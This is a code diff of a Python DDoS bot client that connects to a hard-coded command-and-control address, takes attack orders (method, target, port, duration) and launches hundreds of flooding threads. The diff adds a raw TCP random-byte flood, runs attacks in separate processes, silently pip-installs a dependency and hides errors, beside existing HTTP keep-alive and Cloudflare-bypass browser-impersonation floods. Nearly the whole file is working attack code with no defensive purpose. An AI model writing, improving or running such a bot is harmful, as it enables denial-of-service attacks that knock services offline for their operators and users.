@@ -2,15 +2,28 @@ import socket
 import time
 import random
 from threading import Thread
-from curl_cffi import requests
-
+import os
+import multiprocessing
 host_server = "217.154.161.167"
 host_port = 11951
-thread77 = 700
+thread77 = 250
 redhot = None
 timeattack = None
 target = None
 port = None
+
+
+try:
+    
+    from curl_cffi import requests
+    print("Done")
+    
+    
+except Exception as e:
+    print("Error",e)
+    os.system("pip3 install curl_cffi")
+    
+
 
 def usergents():
     return [
@@ -29,7 +42,7 @@ def method_http(ip, portip, timekk):
                 while time.time() - start < timekk:
                     jgan.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(usergents())}\r\nConnection: keep-alive\r\n\r\n'.encode())
             except Exception as e:
-                print("Erorr", e)
+                hi = "hi"
 
 def method_cloudflare(url, port, timeOs):
     session = requests.Session(impersonate="chrome124")
@@ -49,12 +62,31 @@ def method_cloudflare(url, port, timeOs):
                 full_url = 'https://' + full_url
             r = session.get(full_url, headers=headers, timeout=8)
         except Exception as e:
-            print("Erorr", e)
+            
             time.sleep(0.5)
+
+
+
+def method_tcp(ip,port6,time1):
+    start = time.time()
+    while time.time() - start < time1:
+        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as wlc:
+            wlc.connect((ip,port6))
+            while time.time() - start < time1:
+                try:
+                    wlc.send(random._urandom(1024))
+                except Exception as e:
+                    h = "hi"
+                    
+                
+                
+        
+
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect((host_server, host_port))
 print("Cooncet to Server ")
+
 
 while True:
     data = sock.recv(1024)
@@ -65,15 +97,22 @@ while True:
         target = v0[2]
         port = int(v0[3])
         timeattack = int(v0[4])
-        if method == "http":
-            for _ in range(thread77):
-                Thread(target=method_http, args=(target, port, timeattack)).start()
-            print("Done Start Attack")
-        elif method == "cloudflare":
-            for _ in range(thread77):
-                Thread(target=method_cloudflare, args=(target, port, timeattack)).start()
-            print("Done Start Attack")
-        elif method == "tcp":
-            print("Done Start Attack tcp")
-        else:
-            print("Hey Not found Method")
+        def execute():
+            if method == "http":
+                for _ in range(thread77):
+                    Thread(target=method_http, args=(target, port, timeattack)).start()
+            elif method == "cloudflare":
+                for _ in range(thread77):
+                    Thread(target=method_cloudflare, args=(target, port, timeattack)).start()
+                
+            elif method == "tcp":
+                for _ in range(thread77):
+                    Thread(target=method_tcp, args=(target, port, timeattack)).start()
+                
+                print("Soon")
+            else:
+                print("Method Not Found")
+
+        p = multiprocessing.Process(target=execute)
+        p.start()
+        print("Done Start Attack")
